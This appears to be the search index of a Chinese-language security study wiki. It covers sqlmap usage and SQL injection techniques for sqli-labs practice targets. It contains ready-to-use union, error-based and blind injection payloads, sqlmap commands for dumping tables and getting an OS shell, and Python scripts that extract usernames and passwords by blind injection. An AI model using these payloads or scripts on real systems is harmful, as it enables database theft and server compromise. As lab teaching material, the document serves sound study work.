{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u77e5\u8bc6\u5e93\u7ed3\u6784 \u00b6 Web\u5b89\u5168 \u00b6 SQL\u6ce8\u5165 XSS CSRF SSRF RCE XXE SSTI \u6587\u4ef6\u4e0a\u4f20 \u53cd\u5e8f\u5217\u5316 \u672a\u6388\u6743 \u4e8c\u8fdb\u5236\u5b89\u5168 \u00b6 PWN \u5185\u7f51\u5b89\u5168 \u00b6 PTH \u73af\u5883\u914d\u7f6e \u00b6 Git Java\u5f00\u53d1 \u00b6 Java\u57fa\u7840 JavaWeb Mybatis SpringMVC SpringBoot Python\u5f00\u53d1 \u00b6 Python\u57fa\u7840 Flask Django \u9776\u573a \u00b6 dvwa sqli-labs upload-labs xss-labs pikachu CTF \u00b6 Crypto Misc Web Pwn Re \u6f0f\u6d1e\u5e93 \u00b6 \u5e38\u7528\u5de5\u5177 \u00b6 \u672a\u5206\u7c7b \u00b6","title":"\u77e5\u8bc6\u5e93\u7ed3\u6784"},{"location":"#_1","text":"","title":"\u77e5\u8bc6\u5e93\u7ed3\u6784"},{"location":"#web","text":"SQL\u6ce8\u5165 XSS CSRF SSRF RCE XXE SSTI \u6587\u4ef6\u4e0a\u4f20 \u53cd\u5e8f\u5217\u5316 \u672a\u6388\u6743","title":"Web\u5b89\u5168"},{"location":"#_2","text":"PWN","title":"\u4e8c\u8fdb\u5236\u5b89\u5168"},{"location":"#_3","text":"PTH","title":"\u5185\u7f51\u5b89\u5168"},{"location":"#_4","text":"Git","title":"\u73af\u5883\u914d\u7f6e"},{"location":"#java","text":"Java\u57fa\u7840 JavaWeb Mybatis SpringMVC SpringBoot","title":"Java\u5f00\u53d1"},{"location":"#python","text":"Python\u57fa\u7840 Flask Django","title":"Python\u5f00\u53d1"},{"location":"#_5","text":"dvwa sqli-labs upload-labs xss-labs pikachu","title":"\u9776\u573a"},{"location":"#ctf","text":"Crypto Misc Web Pwn Re","title":"CTF"},{"location":"#_6","text":"","title":"\u6f0f\u6d1e\u5e93"},{"location":"#_7","text":"","title":"\u5e38\u7528\u5de5\u5177"},{"location":"#_8","text":"","title":"\u672a\u5206\u7c7b"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/","text":"sqlmap\u4f7f\u7528 \u00b6 \u68c0\u6d4b\u662f\u5426\u6709WAF sqlmap -u \"\u76ee\u6807url\" --identify-waf sqlmap -u \"\u76ee\u6807url\" --check-waf \u5e38\u7528\u547d\u4ee4\uff1a sqlmap -u [ \"url\" ] --dbs #\u83b7\u53d6\u6570\u636e\u5e93 sqlmap -u [ \"url\" ] --current-user #\u83b7\u53d6\u5f53\u524d\u7528\u6237\u540d\u79f0 sqlmap -u [ \"url\" ] --current-db #\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u540d\u79f0 sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] --tables #\u5217\u51fa\u8868\u540d sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] -T [ '\u8868\u540d' ] --columns #\u5217\u51fa\u5b57\u6bb5 sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] -T [ '\u8868\u540d' ] -C [ '\u5b57\u6bb5\u540d1,\u5b57\u6bb5\u540d2,\u2026' ] --dump #\u83b7\u53d6\u5b57\u6bb5\u5185\u5bb9 --level 3\u6307\u5b9a\u7ea7\u522b\u4e3a3\uff08\u51715\u7ea7\uff0c\u7ea7\u522b\u8d8a\u9ad8\uff0c\u68c0\u6d4b\u8d8a\u5168\u9762\uff09\uff0c\u9ed8\u8ba4\u4f7f\u7528level1\u68c0\u6d4b\u5168\u90e8\u6570\u636e\u5e93\u7c7b\u578b --cookie \"id=1\"--level 2\uff08\u53ea\u6709level\u8fbe\u52302\u624d\u4f1a\u68c0\u6d4bcookie\uff09 bp\u53f3\u952ecopy to file\uff0c\u7136\u540e\u6267\u884csqlmap -r \"c:\\tools\\request.txt\" -p \"username\" \u6307\u5b9ausername\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u6587\u4ef6\u52a0*\u6765\u6307\u5b9a\u6ce8\u5165\u4f4d\u7f6e --os-cmd=ipconfig \u6267\u884c\u7cfb\u7edf\u547d\u4ee4 --os-shell \u83b7\u53d6\u7cfb\u7edfshell --delay 2 \u5ef6\u65f62s\u6ce8\u5165 --file-read = RFILE \u4ece\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u8bfb\u53d6\u6587\u4ef6 \uff08\u7269\u7406\u8def\u5f84\uff09 --file-write = WFILE \u7f16\u8f91\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u672c\u5730\u6587\u4ef6 \uff08mssql xp_shell\uff09 --file-dest = DFILE \u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u5199\u5165\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84","title":"sqlmap\u4f7f\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/#sqlmap","text":"\u68c0\u6d4b\u662f\u5426\u6709WAF sqlmap -u \"\u76ee\u6807url\" --identify-waf sqlmap -u \"\u76ee\u6807url\" --check-waf \u5e38\u7528\u547d\u4ee4\uff1a sqlmap -u [ \"url\" ] --dbs #\u83b7\u53d6\u6570\u636e\u5e93 sqlmap -u [ \"url\" ] --current-user #\u83b7\u53d6\u5f53\u524d\u7528\u6237\u540d\u79f0 sqlmap -u [ \"url\" ] --current-db #\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u540d\u79f0 sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] --tables #\u5217\u51fa\u8868\u540d sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] -T [ '\u8868\u540d' ] --columns #\u5217\u51fa\u5b57\u6bb5 sqlmap -u [ \"url\" ] -D [ '\u6570\u636e\u5e93\u540d' ] -T [ '\u8868\u540d' ] -C [ '\u5b57\u6bb5\u540d1,\u5b57\u6bb5\u540d2,\u2026' ] --dump #\u83b7\u53d6\u5b57\u6bb5\u5185\u5bb9 --level 3\u6307\u5b9a\u7ea7\u522b\u4e3a3\uff08\u51715\u7ea7\uff0c\u7ea7\u522b\u8d8a\u9ad8\uff0c\u68c0\u6d4b\u8d8a\u5168\u9762\uff09\uff0c\u9ed8\u8ba4\u4f7f\u7528level1\u68c0\u6d4b\u5168\u90e8\u6570\u636e\u5e93\u7c7b\u578b --cookie \"id=1\"--level 2\uff08\u53ea\u6709level\u8fbe\u52302\u624d\u4f1a\u68c0\u6d4bcookie\uff09 bp\u53f3\u952ecopy to file\uff0c\u7136\u540e\u6267\u884csqlmap -r \"c:\\tools\\request.txt\" -p \"username\" \u6307\u5b9ausername\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u6587\u4ef6\u52a0*\u6765\u6307\u5b9a\u6ce8\u5165\u4f4d\u7f6e --os-cmd=ipconfig \u6267\u884c\u7cfb\u7edf\u547d\u4ee4 --os-shell \u83b7\u53d6\u7cfb\u7edfshell --delay 2 \u5ef6\u65f62s\u6ce8\u5165 --file-read = RFILE \u4ece\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u8bfb\u53d6\u6587\u4ef6 \uff08\u7269\u7406\u8def\u5f84\uff09 --file-write = WFILE \u7f16\u8f91\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u672c\u5730\u6587\u4ef6 \uff08mssql xp_shell\uff09 --file-dest = DFILE \u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u5199\u5165\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84","title":"sqlmap\u4f7f\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/","text":"SQL\u6ce8\u5165 \u00b6 Sql\u57fa\u7840 \u00b6 mysql\u5185\u7f6e\u7684information_schema\u6570\u636e\u5e93\u4e2d\u6709\u4e09\u4e2a\u8868\u975e\u5e38\u91cd\u8981 schemata:\u8868\u91cc\u5305\u542b\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 tables\uff1a\u8868\u91cc\u5305\u542b\u6240\u6709\u6570\u636e\u5e93\u7684\u6240\u6709\u7684\u8868\uff0c\u9ed8\u8ba4\u5b57\u6bb5\u4e3atable_name columns:\u4e09\u4e2a\u5217\u975e\u5e38\u91cd\u8981 TABLE_SCHEMA\uff1a\u6570\u636e\u5e93\u540d TABLE_NAME:\u8868\u540d COLUMN_NAME:\u5b57\u6bb5\u540d PHP\u7684\u5305\u542b\u6587\u4ef6\u51fd\u6570\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u662f**include**\u548c**require**\u3002 require\u751f\u6210\u4e00\u4e2a\u81f4\u547d\u9519\u8bef\uff08E_COMPILE_ERROR\uff09\uff0c\u5728\u9519\u8bef\u53d1\u751f\u540e\u811a\u672c\u4f1a\u505c\u6b62\u6267\u884c\u3002 include\u751f\u6210\u4e00\u4e2a\u8b66\u544a\uff08E_WARNING\uff09\uff0c\u5728\u9519\u8bef\u53d1\u751f\u540e\u811a\u672c\u4f1a\u7ee7\u7eed\u6267\u884c\u3002 @\u662f\u53ef\u4ee5**\u5c4f\u853d**\u51fd\u6570\u6267\u884c\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\u800c\u4ea7\u751f\u7684\u4e00\u4e9b\u9519\u8bef\u3001 \u8b66\u544a\u4fe1\u606f \uff0c\u8fd9\u6837\u7528\u6237\u5c31\u770b\u4e0d\u5230\u7a0b\u5e8f\u7684\u51fa\u9519\u4fe1\u606f\u3002\u8fd9\u6837\u9664\u4e86\u7528\u6237\u754c\u9762\u4f1a\u53cb\u597d\u4e00\u4e9b\u5916\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5b89\u5168\u6027\uff0c\u56e0\u4e3a\u5c4f\u853d\u4e86**\u51fa\u9519\u6587\u4ef6\u7684\u8def\u5f84**\u7b49\u4fe1\u606f\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u7528\u6237\u4e0d\u5e94\u8be5\u770b\u5230\u540e\u7aef\u4efb\u4f55\u5176\u4ed6\u4fe1\u606f\u3002 die() \u51fd\u6570\u8f93\u51fa\u4e00\u6761\u6d88\u606f\uff0c\u5e76\u9000\u51fa\u5f53\u524d\u811a\u672c\u3002 \u62fc\u63a5sql $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; \u6211\u4eec\u5224\u65ad\u662f\u5426\u6709\u6ce8\u5165\u70b9\u4e00\u822c\u662f\u901a\u8fc7\u4e09\u4e2a\u65b9\u9762\uff0c\u5982\u679c\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u70b9\uff0c\u57fa\u672c\u53ef\u4ee5\u65ad\u5b9a\u5b58\u5728\u6ce8\u5165\u70b9 id=1' \u52a0\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u8fd9\u91cc\u7684\u5355\u5f15\u53f7\uff0c\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u7279\u6b8a\u7b26\u53f7\uff0c\u56e0\u4e3aSQL\u9690\u5f0f\u8f6c\u6362\u7684\u539f\u56e0\uff0c\u4e00\u822c\u662f\u52a0\u95ed\u5408\u7b26\u53f7\u4f7f\u5176\u62a5\u9519 id=1 and 1=1 \u8fd4\u56de\u6b63\u786e\u7ed3\u679c\uff0c\u8fd9\u91cc1=1\u4e5f\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u52a0\u5165true\u7684\u67e5\u8be2\u8bed\u53e5\u4f1a\u4e0d\u4f1a\u6267\u884c id=1 and 1=2 \u8fd4\u56de\u9519\u8bef\uff0c\u8fd9\u91cc1=2\u4e5f\u662f\u6cdb\u6307\uff0c\u6cdb\u6307\u52a0\u5165false\u7684\u67e5\u8be2\u8bed\u53e5\u4f1a\u4e0d\u4f1a\u6267\u884c MySQL\u7684 \u9690\u5f0f\u8f6c\u6362 \uff1a \u82e5\u5b57\u7b26\u4e32\u662f\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u5e76\u4e14\u5168\u90e8\u90fd\u662f\u6570\u5b57\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f\u6574\u4e2a\u5b57\u7b26\u4e32\uff1b\u90e8\u5206\u662f\u6570\u5b57\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f\u622a\u6b62\u5230\u7b2c\u4e00\u4e2a\u4e0d\u662f\u6570\u5b57\u7684\u5b57\u7b26\u4e3a\u6b62 \u82e5\u5b57\u7b26\u4e32\u4e0d\u662f\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u5219\u8f6c\u6362\u7684\u6570\u5b57\u7ed3\u679c\u662f 0 id\u5b57\u6bb5\u662fint\u7c7b\u578b\uff0c\u5728\u505awhere\u5224\u65ad\u65f6 1 and 1=1 \u4e0e 1 and 1=2 \u5747\u88ab\u8f6c\u6362\u4e3a\u6570\u5b57 1 \u4e86\uff0c\u6240\u4ee5\u624d\u4f1a\u663e\u793a\u6b63\u786e\u9875\u9762 MySQL\u7684**\u5e03\u5c14\u7c7b\u578b**\u8f6c\u6362 \u9690\u5f0f\u8f6c\u6362 \uff1a \u5f53\u8fd0\u7b97\u7b26\uff0c\u51fd\u6570\u6216\u8005\u6d41\u7a0b\u63a7\u5236\u7ed3\u6784\u9700\u8981\u4e00\u4e2a boolean \u53c2\u6570\u65f6\uff0c\u8be5\u503c\u4f1a\u88ab \u81ea\u52a8\u8f6c\u6362 \u22651 \u7684\u6570\u503c\u4f1a\u88ab\u8f6c\u6362\u6210 TRUE 0\u6216\u5176\u4ed6\u975e\u6570\u5b57\u5f00\u5934\u5b57\u7b26\u4e32 \u4f1a\u88ab\u8f6c\u6362\u6210 FALSE \u5c31\u50cf\u7b2c\u4e00\u5173\u7684 '2a' \u5148\u662f\u9690\u5f0f\u8f6c\u6362 \u4e3a \u6570\u5b572 \uff0c\u7136\u540e\u56e0\u4e3a\u4e0e\u5e03\u5c14\u7c7b\u578b\u8fd0\u7b97\uff0c\u53c8\u88ab\u8f6c\u6362\u4e3a TRUE \u540e\u9762\u7684\u5c31\u8ddf\u524d\u9762\u7684\u6d41\u7a0b\u4e00\u6837\uff0c\u53ea\u662f\u95ed\u5408\u662f ') preg_replace \u6b63\u5219\u5339\u914d\u4fee\u9970\u7b26 \uff1a i\uff1a\u641c\u7d22\u65f6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff1aA\u548ca\u6ca1\u6709\u533a\u522b g\uff1a\u641c\u7d22\u65f6\u4f1a\u67e5\u627e\u6240\u6709\u7684\u5339\u914d\u9879,\u5982\u679c\u6ca1\u6709\u6807\u5fd7 g\uff0c\u5219\u6b63\u5219\u8868\u8fbe\u5f0f\u4ec5\u67e5\u627e\u7b2c\u4e00\u4e2a\u5339\u914d\u9879 m\uff1a\u591a\u884c\u6a21\u5f0f\uff0c\u8fd9\u4ec5\u4ec5\u4f1a\u5f71\u54cd ^ \u548c $ \u951a\u7b26\u7684\u884c\u4e3a\uff0c\u4e0d\u4ec5\u4ec5\u5339\u914d\u6587\u672c\u7684\u5f00\u59cb\u4e0e\u7ed3\u675f\uff0c\u8fd8\u5339\u914d\u6bcf\u4e00\u884c\u7684\u5f00\u59cb\u4e0e\u7ed3\u675f\u3002 ^ \u5339\u914d\u6587\u672c\u5f00\u5934\uff0c $ \u5339\u914d\u6587\u672c\u672b\u5c3e s\uff1a\u542f\u7528 \u201cdotall\u201d \u6a21\u5f0f\uff0c\u5141\u8bb8\u70b9 . \u5339\u914d\u6362\u884c\u7b26 \\n\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u70b9\u4e0e\u6362\u884c\u7b26 \\n \u4e0d\u5339\u914d\uff09 \u5206\u7c7b \u00b6 \u57fa\u4e8e\u6ce8\u5165\u4f4d\u7f6e \u00b6 GET\u578b POST\u578b User-Agent\u578b Referer\u578b Cookie\u578b \u57fa\u4e8e\u95ed\u5408\u65b9\u6cd5 \u00b6 ' ) \" \") ') ')) \")) \u6570\u503c\u578b\u65e0\u9700\u95ed\u5408 \u57fa\u4e8e\u6ce8\u5165\u8bed\u53e5\u7c7b\u578b \u00b6 select\u8bed\u53e5 update\u8bed\u53e5 $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; \u5728\u66f4\u65b0passwd\u4e2d\u53ef\u4ee5\u6ce8\u5165 uname=admin&passwd=' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#&submit=Submit uname=admin&passwd=' and extractvalue(null,concat(0x7e,database(),0x7e))#&submit=Submit insert\u8bed\u53e5 $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; insert\u7c7b\u578b\u7684\u6ce8\u5165\u4e5f\u662f\u9700\u8981\u914d\u5408\u62a5\u9519\u51fd\u6570updatexml()\u3001extractvalue()\u3001floor()\u56de\u663e\u4fe1\u606f\uff0c\u4fdd\u8bc1\u95ed\u5408\u5373\u53ef\uff0c\u4e0d\u8fc7\u6b64\u5904\u7684\u6ce8\u5165\u70b9\u5728uagent\u5185 User-Agent: ',1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))# INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('',1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))#', '127.0.0.1', 1) \u6ce8\u5165\u65b9\u6cd5\u603b\u7ed3 \u00b6 \u8054\u5408\u67e5\u8be2 \u00b6 \u6d4b\u8bd5\u53d1\u73b0\u662f\u5355\u5f15\u53f7\u95ed\u5408 $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\"; \u76f4\u63a5\u4e0a\u8054\u5408\u67e5\u8be2 ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ \u7206\u8868\u540d ?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='8fof1zun81'--+ \u7206\u5217\u540d ?id=-1' union select 1,group_concat(secret_31F4),3 from 8fof1zun81--+ \u83b7\u53d6key\u503c \u62a5\u9519\u6ce8\u5165 \u00b6 \u4ee5php\u4e3a\u4f8b\uff0c\u9700\u8981\u6e90\u7801\u4ee3\u7801\u5f02\u5e38\u5904\u7406\u4e2d\u5b58\u5728\u6253\u5370\u9519\u8bef\u7684\u65b9\u6cd5 print_r(mysqli_error($con1)); \uff0c\u624d\u80fd\u5229\u7528\u62a5\u9519\u6ce8\u5165\u56de\u663e\u9519\u8bef\u7ed3\u679c updatexml() \u00b6 UPDATEXML(XML_document,XPath_string,new_value); \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string\uff08Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff09 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value,String\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u7b26\u5408\u6761\u4ef6\u7684\u6570\u636e \u901a\u4fd7\u7684\u5c06\u5c31\u662f\u627e\u5230\u6570\u636e\u66ff\u6362\u6570\u636e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6211\u4eec\u662f\u7528\u4e0d\u5230\u7684\uff0c\u7528\u5230\u7684\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4e14\u662f\u4ed6\u7684\u62a5\u9519\u8fd4\u56de\u503c\u3002 http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,version()),0) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,version()),0) -- -' LIMIT 0,1 \u5982\u679c\u4e0d\u52a0concat()\u7684\u8bdd\u62a5\u9519\u56de\u663e\u7ed3\u679c\u4e0d\u5168 payload\uff1a http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),10) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),1) -- -' LIMIT 0,1 \u663e\u793a\u4e0d\u5168 \u53ef\u4ee5\u9010\u884c\u8f93\u51fa http://localhost/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- - SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- -' LIMIT 0,1 extractvalue() \u00b6 ExtractValue\uff08xml_document,xpath_string\uff09 \u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u7684\u5b57\u7b26\u4e32 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string\uff08Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff09 http://localhost/sqli/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- - SELECT * FROM users WHERE id='1' and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- -' LIMIT 0,1 floor() \u00b6 \u6700\u7ec8payload\uff1a http://localhost/sqli/Less-5/?id=1' and (SELECT 1 from(select count(*),CONCAT(DATABASE(),floor(rand(0)*2))x from users group by x)a)-- - SELECT * FROM users WHERE id='1' and (select 1 from (select count(*) ,concat(database(),floor(rand(0)*2))x from users group by x)a) -- -' LIMIT 0,1 rand()\u4ea7\u751f0\u52301\u7684\u968f\u673a\u6570\uff0c rand(0) \u5185\u7684 0 \u662f\u79cd\u5b50\uff0c\u56fa\u5b9a\u79cd\u5b50\u4ea7\u751f\u7684\u968f\u673a\u6570\u90fd\u662f\u4e00\u6837\u7684 floor() \u51fd\u6570\u8fd4\u56de\u5c0f\u4e8e\u6216\u7b49\u4e8ex\u7684\u6700\u5927\u6574\u6570 floor(rand(0)*2) \u51fd\u6570\u5c31\u662f\u5c060\u52301\u7684\u968f\u673a\u6570\u4e58\u4ee52\u4e4b\u540e\u518d\u5411\u4e0b\u53d6\u6574 \u56e0\u4e3a\u79cd\u5b50\u56fa\u5b9a\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5e8f\u5217\u4e5f\u662f\u56fa\u5b9a\u7684011011\u2026 concat(database(),floor(rand(0)*2))x \u8fd9\u91cc\u662f\u5c06 concat(database(),floor(rand(0)*2)) \u53eb\u4e3a x \uff0c\u5c31\u662f\u8d77\u4e2a\u522b\u540d group by key\u5728\u6267\u884c\u65f6\u5faa\u73af\u8bfb\u53d6\u6570\u636e\u7684\u6bcf\u4e00\u884c\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e8e**\u4e34\u65f6\u8868**\u4e2d\u3002\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684key\u65f6\uff0c\u5982\u679ckey\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u66f4\u65b0\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e \uff08\u66f4\u65b0\u65f6\uff0c\u4e0d\u518d\u8ba1\u7b97rand\u503c\uff09 \uff1b\u5982\u679c\u8be5key\u4e0d\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u5728\u4e34\u65f6\u8868\u4e2d\u63d2\u5165key\u6240\u5728\u884c\u7684\u6570\u636e\u3002 \uff08\u63d2\u5165\u6570\u636e\u65f6\uff0c\u4f1a\u518d\u8ba1\u7b97rand\u503c\uff09 \u7531\u4e8efloor(rand(0)*2)\u7684\u8ba1\u7b97\u7ed3\u679c01101100\u2026\uff0c\u5bfc\u81f4\u4e34\u65f6\u8868\u63d2\u5165\u65b0\u884c\u65f6\u4e3b\u952e\u51b2\u7a81 \u5c31\u4f1a\u7206\u51fa Duplicate entry 'security1' for key <group_key> and (select 1 from \u5fc5\u987b\u52a0\uff0c\u5426\u5219\u62a5\u51fa Operand should contain 1 column\uff08\u64cd\u4f5c\u6570\u5e94\u5305\u542b1\u5217\uff09 \uff0c\u56e0\u4e3aand\u540e\u9762\u7684\u8bed\u53e5\u751f\u6210\u7684\u662f\u4e00\u4e2a \u865a\u8868 \uff0c\u800c\u6211\u4eec\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06and\u540e\u9762\u67e5\u8be2\u6539\u4e3a\u5e03\u5c14\u503c\u3002 \u5e03\u5c14\u76f2\u6ce8 \u00b6 ' \u95ed\u5408\u7684\u5e03\u5c14\u578b\u76f2\u6ce8 http://localhost/sqli/Less-8/?id=1' and ascii(substr(database(),1,1))=115 -- - SELECT * FROM users WHERE id='1' and ascii(substr(database(),1,1))=115 -- -' LIMIT 0,1 \u56de\u663e\u6b63\u5e38\u9875\u9762\u8bf4\u660eand\u540e\u9762\u4e3atrue ?id=1') and length((select database()))=10--+ \u5e03\u5c14\u76f2\u6ce8 substr(database(),1,1) \u610f\u601d\u662f\u622a\u53d6\u6570\u636e\u5e93\u540d\uff0c\u4ece\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5f00\u59cb\u622a\u53d6\u4e00\u4e2a\u5b57\u7b26 's' ascii() \u662f\u5c06\u5b57\u7b26\u8f6c\u6362\u4e3a ASCII\u7801 \uff0c 's' \u5bf9\u5e94\u7684ASCII\u7801\u662f 115 length() \u51fd\u6570\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 left() \u51fd\u6570\uff0c\u8fd4\u56de\u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u56fa\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32 \u7136\u540e\u53ef\u4ee5\u76f4\u63a5\u4e0a\u811a\u672c\u6216\u8005sqlmap\u4e86 import string import requests from time import sleep arlist = string . printable Baseurl = \"http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1' and \" def checkurl ( url ): res = requests . get ( url ) if res . ok : if 'You are in' in res . text : return True return False def main (): flag = '' for g in range ( 100 ): for i in arlist : payload = \"substr((select group_concat(username,password) from users), %s ,1) = \\' %s \\' --+\" % ( g , i ) finalurl = Baseurl + payload if checkurl ( finalurl ): flag = flag + str ( i ) print ( flag ) sleep ( 0.2 ) if __name__ == \"__main__\" : main () \u65f6\u95f4\u76f2\u6ce8 \u00b6 \u4e0d\u7ba1\u662f\u6b63\u786e\u4e0e\u5426\uff0c\u9875\u9762\u90fd\u663e\u793a\u4e00\u6837\u7684\u5185\u5bb9\uff0c\u53ea\u80fd\u901a\u8fc7\u5ef6\u65f6\u6765\u89c2\u5bdf\u662f\u5426\u6267\u884c\u4e86sql\u8bed\u53e5 ?id=1') and if(length((select database()))=10,sleep(5),1)--+ \u65f6\u95f4\u6ce8\u5165\uff0c\u5982\u679c\u51fa\u73b0\u5ef6\u8fdf\u8868\u793a\u8be5\u6570\u636e\u5e93\u540d\u957f\u5ea6\u662f10 \u7136\u540e\u5c31\u662f\u4e0a\u811a\u672c\u6216\u8005sqlmap\u4e86 import string import requests from time import sleep arlist = string . printable Baseurl = \"http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1' and \" def checkurl ( url ): try : res = requests . get ( url , timeout = 3 ) #\u5982\u679c\u6267\u884c\u4e86sleep\u8fd9\u91cc\u4f1a\u8d85\u65f6\u4ea7\u751f\u5f02\u5e38 return True except Exception as e : return False def main (): flag = '' for g in range ( 100 ): for i in arlist : payload = \"if((substr((select group_concat(username,password) from users), %s ,1) = \\' %s \\' ),sleep(5),1)--+\" % ( g , i ) finalurl = Baseurl + payload if checkurl ( finalurl ): flag = flag + str ( i ) print ( flag ) sleep ( 0.2 ) if __name__ == \"__main__\" : main () sleep() \u00b6 sleep(N) N\u4e3a\u6570\u503c\uff0c\u5355\u4f4d\u662f\u79d2\uff0c\u52a0\u4e0a\u6b64\u503c\uff0c\u67e5\u8be2\u8bed\u53e5\u4f1a\u7b49\u5f85N\u79d2\u6267\u884c 1' and if((substr(database(),1,1))='s',sleep(5),null) benchmark() \u00b6 benchmark(count,expr) count:\u8fd0\u884c\u6b21\u6570 expr:\u8fd0\u884c\u7684\u547d\u4ee4 \u7b1b\u5361\u5c14\u79ef \u00b6 